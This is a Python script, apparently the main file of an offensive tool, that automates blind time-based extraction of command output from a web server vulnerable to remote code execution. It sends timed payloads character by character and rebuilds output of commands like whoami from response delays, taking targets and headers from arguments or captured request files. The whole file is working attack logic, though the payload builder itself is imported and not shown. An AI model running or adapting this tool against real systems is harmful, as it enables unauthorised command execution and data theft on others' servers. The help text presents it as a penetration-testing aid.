import argparse
import asyncio
import itertools
import threading
import sys
import time
import os 

from helpers.send_requests import *
from constants.chars import chars
from constants.payload import create_payload
from constants.loading import cycle
from helpers.string import arr_to_string_sanitizer
from termcolor import colored
from banner.title import banner
from helpers.message_box import border_msg
from helpers.file import get_headers, get_header_json_object,get_headers_target_method_http

global_data = list()
global_delay_sec = 10
grace_period_sec = 1
is_done = False  
 
def main ():
    banner()
    parser = argparse.ArgumentParser(description="[options]")
    parser.add_argument('-t', '--target', type=str,  metavar ='--target', help="Target site that vulnerable to RCE, The main purpose of this script is to extract all the data that we can't see or the data that doesnt appear in the response when doing penetration testing. ")
    parser.add_argument('-m', '--method', type=str,  metavar ='--method', help="HTTP Method: GET, POST, PUT, DELETE, DEFAULT GET", default="GET")
    parser.add_argument('-c', '--command', type=str,  metavar ='--command', help="Command that will send to the server. Ex: whoami, uname -a, lsb_release -a, ls -la")
    parser.add_argument('-d', '--delay', type=str,  metavar ='--delay',  help="Delay in seconds to wait to the response of the server, DEFAULT 10")
    parser.add_argument('-l', '--logs', type=str,  metavar ='--logs',  help="Whether you want to see the logs while injecting payload, DEFAULT TRUE", default="true" )
    parser.add_argument('-f', '--file', type=str,  metavar ='--file', help="Request header file, can get it from your burpsuite, caido, http header or tamper. Ex: file_request.txt")
    parser.add_argument('-j', '--json', type=str,  metavar ='--json',  help="Header JSON data of the request, It could be an array [] or object {} ex: {'username':john_doe, password:123456}" )
    parser.add_argument('-H', '--Headers', type=str,  metavar ='--Headers',  help="Headers to be added to the request. It must be array ['X-Header: John_doe', 'X-HackerOne: john_doe_1337']")

    args = parser.parse_args()
    is_logs_enabled = args.logs
    file = args.file
    target = args.target
    method = args.method
    delay = args.delay
    command = args.command
    json = args.json
    headers = args.Headers
    
    input_errors = []
    
    if (target is None) & (file is None):
        input_errors.append("'-t --target' OR '-f --file' must be specified ")
            
    if delay:
        global global_delay_sec
        if (int(delay) > 1):
            global_delay_sec = delay
        else:
            input_errors.append("Delay '-d' must be greater than 1")
        
    if is_logs_enabled:
        if (is_logs_enabled.lower() == 'true'):
            is_logs_enabled = True
        elif (is_logs_enabled.lower() == 'false'):
            is_logs_enabled = False
        else:
            input_errors.append("Invalid value for logs, it should be true/false")

    if(file is not None):
        try:
            if(target is not None) | (headers is not None) | (json is not None): 
                input_errors.append("When using  '-f --file', You don't need to specify the '-t --target, -j --json, -H --Headers', You have to remove those arguments.")
            else:   
                t = file
                # open a file
                with open(t, encoding="utf-8") as text:
                    # make a file an array
                    arr = [l.rstrip("\n") for l in text]
                    d_headers = get_headers_target_method_http(arr)
                    target = d_headers['target']
                    method = d_headers['method']
                    
                    headers = get_headers(arr)
                    json = get_header_json_object(arr)
        except FileNotFoundError as fnf_error:
            input_errors.append("File Not Found")
            return print("[Exceptions]:", fnf_error)
    
    if(len(input_errors)):
        for error in input_errors:
            print(colored("\n\n[WARNING] ","yellow") + colored(error,"white"))
            return
        
    thread = threading.Thread(target=while_wait)
    thread.start()

    if(vulnerability_check({
        "target":target,
        "method":method,
        "headers":headers,
        "json":json,
        })):
        attack({
            "target":target,
            "method":method,
            "command":command,
            "headers":headers,
            "json":json,
            "current_len": 1,
            "is_logs_enabled": is_logs_enabled
            })
        print(colored("\n\n[RESULTS] ","green"))
        print(border_msg(arr_to_string_sanitizer(global_data), 50))
    global is_done
    is_done = True

def while_wait():
    for c in itertools.cycle(cycle):
        if is_done:
            break
        sys.stdout.write('\r[Please wait...] ' + arr_to_string_sanitizer(global_data) + c)
        sys.stdout.flush()
        time.sleep(0.1)
    print(colored("\n[+] ","green") + colored("FINISHED!","white"))
    print(colored("\n[Read]: When you noticed that the attack was done too early and/or the data seems incomplete or unfinished. It is recommended to increase the delay by using '-d' or '--delay' to a number that is something bigger than before. Current delay is %s, Don't forget to buy me a coffee. email me at thejolotoproject@gmail.com. "%(global_delay_sec),"yellow"))
    print("\n\n")
    
def attack(data):
    target,method,command,headers,json,current_len,is_logs_enabled = data.values()
    keys = chars
    loop = asyncio.new_event_loop()
    tasks = list()
    
    async def create_tasks_func():
        for current_key in keys:
            payload = create_payload({
                "target":target,
                "command":command,
                "current_len":current_len,
                "current_key":current_key,
                "global_delay_sec":global_delay_sec
                })
            tasks.append(asyncio.create_task(call({
                "payload": payload,
                "method":method,
                "headers":headers,
                "json":json,
                "current_key":current_key,
                "is_logs_enabled":is_logs_enabled
                })))
        await asyncio.wait(tasks)
    loop.run_until_complete(create_tasks_func())
    
    arr = list()
    for t in tasks:
        arr.append(t.result())
    
    arr = sorted(arr, key=lambda x: x['time'],reverse=True)
    if float(arr[0]['time']) + grace_period_sec >= float(global_delay_sec):
        if arr[0]['key']:
            global_data.append(arr[0]['key'])
            attack({
                "target":target,
                "method":method,
                "command":command, 
                "headers":headers,
                "json":json,
                "current_len": current_len + 1,
                "is_logs_enabled":is_logs_enabled
                })
    loop.close()
    
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print('Interrupted')
        try:
            is_done = True
            sys.exit(130)
        except SystemExit:
            is_done = True
            os._exit(130)